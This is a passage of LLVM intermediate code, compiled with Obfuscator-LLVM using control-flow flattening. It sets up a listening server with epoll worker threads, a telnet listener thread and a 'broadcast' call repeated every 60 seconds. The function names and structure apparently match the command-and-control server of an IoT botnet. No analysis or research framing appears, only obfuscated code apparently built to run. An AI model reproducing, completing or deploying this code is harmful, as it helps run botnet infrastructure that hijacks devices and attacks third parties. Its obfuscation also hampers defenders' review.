; <label>:54:                                     ; preds = %loopEntry
  %55 = load volatile i32, i32* @listenFD, align 4
  %56 = call i32 @make_socket_non_blocking(i32 %55)
  store i32 %56, i32* %8, align 4
  %57 = load i32, i32* %8, align 4
  %58 = icmp eq i32 %57, -1
  %59 = select i1 %58, i32 -1197030190, i32 144386018
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  call void @abort() #10
  unreachable

; <label>:61:                                     ; preds = %loopEntry
  %62 = load volatile i32, i32* @listenFD, align 4
  %63 = call i32 @listen(i32 %62, i32 128) #7
  store i32 %63, i32* %8, align 4
  %64 = load i32, i32* %8, align 4
  %65 = icmp eq i32 %64, -1
  %66 = select i1 %65, i32 134800795, i32 -290911186
  store i32 %66, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.216, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:68:                                     ; preds = %loopEntry
  %69 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %69, i32* @epollFD, align 4
  %70 = load volatile i32, i32* @epollFD, align 4
  %71 = icmp eq i32 %70, -1
  %72 = select i1 %71, i32 -1528375178, i32 -586307752
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.217, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:74:                                     ; preds = %loopEntry
  %75 = load volatile i32, i32* @listenFD, align 4
  %76 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %77 = bitcast %union.epoll_data* %76 to i32*
  store i32 %75, i32* %77, align 1
  %78 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %78, align 1
  %79 = load volatile i32, i32* @epollFD, align 4
  %80 = load volatile i32, i32* @listenFD, align 4
  %81 = call i32 @epoll_ctl(i32 %79, i32 1, i32 %80, %struct.epoll_event* %11) #7
  store i32 %81, i32* %8, align 4
  %82 = load i32, i32* %8, align 4
  %83 = icmp eq i32 %82, -1
  %84 = select i1 %83, i32 -1992806374, i32 -1165350281
  store i32 %84, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %9, align 4
  %88 = add nsw i32 %87, 2
  %89 = zext i32 %88 to i64
  %90 = call i8* @llvm.stacksave()
  store i8* %90, i8** %12, align 8
  %91 = alloca i64, i64 %89, align 16
  store i64* %91, i64** %.reg2mem2
  store i32 845009327, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i32, i32* %9, align 4
  %94 = add nsw i32 %93, -1
  store i32 %94, i32* %9, align 4
  %95 = icmp ne i32 %93, 0
  %96 = select i1 %95, i32 -1503284932, i32 -1603230701
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i32, i32* %9, align 4
  %99 = add nsw i32 %98, 1
  %100 = sext i32 %99 to i64
  %.reload4 = load volatile i64*, i64** %.reg2mem2
  %101 = getelementptr inbounds i64, i64* %.reload4, i64 %100
  %102 = call i32 @pthread_create(i64* %101, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #7
  store i32 845009327, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %.reload3 = load volatile i64*, i64** %.reg2mem2
  %104 = getelementptr inbounds i64, i64* %.reload3, i64 0
  %105 = load i32, i32* %10, align 4
  %106 = sext i32 %105 to i64
  %107 = inttoptr i64 %106 to i8*
  %108 = call i32 @pthread_create(i64* %104, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %107) #7
  store i32 833997524, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 1452906619, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.218, i32 0, i32 0))
  %111 = call i32 @sleep(i32 60)
  store i32 833997524, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %110, %109, %103, %97, %92, %86, %74, %68, %61, %54, %44, %43, %41, %37, %23, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  store i32 %16, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 724937052, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 724937052, label %first
    i32 1726054113, label %19
    i32 -1915340309, label %24
    i32 37356847, label %26
    i32 1138781425, label %30
    i32 -534027865, label %44
    i32 1972756810, label %45
    i32 1317241540, label %51
    i32 1950850050, label %52
    i32 700256998, label %64
    i32 -1118761144, label %65
    i32 -417197580, label %68
    i32 -217094624, label %72
    i32 1758430219, label %76
    i32 441801846, label %79
    i32 -1177272071, label %82
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %17 = icmp ne i32 %.reload, 0
  %18 = select i1 %17, i32 1726054113, i32 -1915340309
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %21 = load i32, i32* %7, align 4
  %22 = call i8* @gai_strerror(i32 %21) #7
  %23 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %20, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.220, i32 0, i32 0), i8* %22)
  store i32 -1, i32* %2, align 4
  store i32 -1177272071, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %25, %struct.addrinfo** %6, align 8
  store i32 37356847, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %28 = icmp ne %struct.addrinfo* %27, null
  %29 = select i1 %28, i32 1138781425, i32 -217094624
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %32 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %31, i32 0, i32 1
  %33 = load i32, i32* %32, align 4
  %34 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %35 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %34, i32 0, i32 2
  %36 = load i32, i32* %35, align 8
  %37 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %38 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = call i32 @socket(i32 %33, i32 %36, i32 %39) #7
  store i32 %40, i32* %8, align 4
  %41 = load i32, i32* %8, align 4
  %42 = icmp eq i32 %41, -1
  %43 = select i1 %42, i32 -534027865, i32 1972756810
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 -417197580, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %46 = load i32, i32* %8, align 4
  %47 = bitcast i32* %9 to i8*
  %48 = call i32 @setsockopt(i32 %46, i32 1, i32 2, i8* %47, i32 4) #7
  %49 = icmp eq i32 %48, -1
  %50 = select i1 %49, i32 1317241540, i32 1950850050
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.221, i32 0, i32 0))
  store i32 1950850050, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %8, align 4
  %54 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %55 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %54, i32 0, i32 5
  %56 = load %struct.sockaddr*, %struct.sockaddr** %55, align 8
  %57 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %58 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %57, i32 0, i32 4
  %59 = load i32, i32* %58, align 8
  %60 = call i32 @bind(i32 %53, %struct.sockaddr* %56, i32 %59) #7
  store i32 %60, i32* %7, align 4
  %61 = load i32, i32* %7, align 4
  %62 = icmp eq i32 %61, 0
  %63 = select i1 %62, i32 700256998, i32 -1118761144
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -217094624, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %8, align 4
  %67 = call i32 @close(i32 %66)
  store i32 -417197580, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %70 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %69, i32 0, i32 7
  %71 = load %struct.addrinfo*, %struct.addrinfo** %70, align 8
  store %struct.addrinfo* %71, %struct.addrinfo** %6, align 8
  store i32 37356847, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %74 = icmp eq %struct.addrinfo* %73, null
  %75 = select i1 %74, i32 1758430219, i32 441801846
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %78 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %77, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.222, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 -1177272071, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %80) #7
  %81 = load i32, i32* %8, align 4
  store i32 %81, i32* %2, align 4
  store i32 -1177272071, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %2, align 4
  ret i32 %83

loopEnd:                                          ; preds = %79, %76, %72, %68, %65, %64, %52, %51, %45, %44, %30, %26, %24, %19, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
